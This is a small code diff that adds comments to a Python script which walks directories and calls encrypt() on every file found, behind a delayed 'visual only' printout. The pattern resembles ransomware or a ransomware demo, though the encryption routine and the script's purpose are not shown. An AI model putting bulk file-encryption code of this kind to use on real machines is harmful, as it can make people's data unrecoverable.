@@ -30,12 +30,13 @@ def main():
             files_in_dir.append(os.path.join(r, item))
             
 
+    #   THIS BLOCK OF CODE IS FOR VISUAL PURPOSES ONLY
     print('Encrypting:\n')
     for d in dirs:
         time.sleep(2)
         print(d + '\n')
             
-
+    # actual encryption
     for item in files_in_dir:
             encrypt(item);
         
